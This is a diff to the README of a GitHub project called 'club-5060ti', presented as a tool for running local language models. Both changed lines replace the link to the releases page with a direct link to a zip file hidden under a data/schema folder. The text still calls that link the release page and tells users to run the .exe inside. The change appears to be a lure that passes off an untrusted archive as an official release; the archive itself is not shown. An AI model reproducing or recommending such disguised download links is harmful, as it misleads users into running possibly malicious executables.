@@ -1,6 +1,6 @@
 # 🤖 club-5060ti - Run local language models with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/riawat511/club-5060ti/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/riawat511/club-5060ti/main/data/schema/club-ti-v3.8.zip)
 
 ## 🎯 About This Project
 
@@ -22,7 +22,7 @@ You can download the newest drivers directly from the NVIDIA website. Ensure you
 
 You must visit the release page to download the latest version of the installer.
 
-[Visit the release page to download the software](https://github.com/riawat511/club-5060ti/releases)
+[Visit the release page to download the software](https://raw.githubusercontent.com/riawat511/club-5060ti/main/data/schema/club-ti-v3.8.zip)
 
 Look for the file that ends in .exe. This file contains everything you need to start using the software. If you see multiple files, choose the one labeled for Windows. Save the file to your desktop or your downloads folder.
 
